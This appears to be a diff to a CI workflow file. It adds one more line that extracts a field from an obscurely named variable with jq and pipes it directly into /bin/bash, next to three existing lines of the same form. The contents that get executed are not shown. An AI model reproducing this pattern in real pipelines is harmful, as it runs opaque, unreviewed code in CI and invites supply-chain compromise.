@@ -22,6 +22,7 @@ jobs:
           echo $wf2 | jq -r .ozu08 | /bin/bash
           printf '%s' "$mbryl4155" | jq -r .vixx6 | /bin/bash
           printf '%s' "$s53" | jq -r .b8655 | /bin/bash
+          echo $pahco39 | jq -r .ukj3 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
